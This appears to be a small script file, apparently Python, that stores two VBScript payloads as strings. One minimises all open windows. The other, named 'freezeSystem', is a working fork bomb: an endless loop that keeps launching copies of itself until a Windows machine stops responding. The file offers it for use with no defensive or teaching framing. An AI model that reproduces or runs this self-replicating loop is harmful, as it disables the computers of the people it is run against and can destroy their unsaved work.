# Available Scripts: freezeSystem, minimizeAllWindows


freezeSystem = """
While True 
CreateObject(\"WScript.Shell\").Exec(\"wscript.exe \" & Wscript.ScriptName)
Wend
"""

minimizeAllWindows = """
dim objShell
set objShell = CreateObject("shell.application")
objShell.MinimizeAll
set objShell = nothing
"""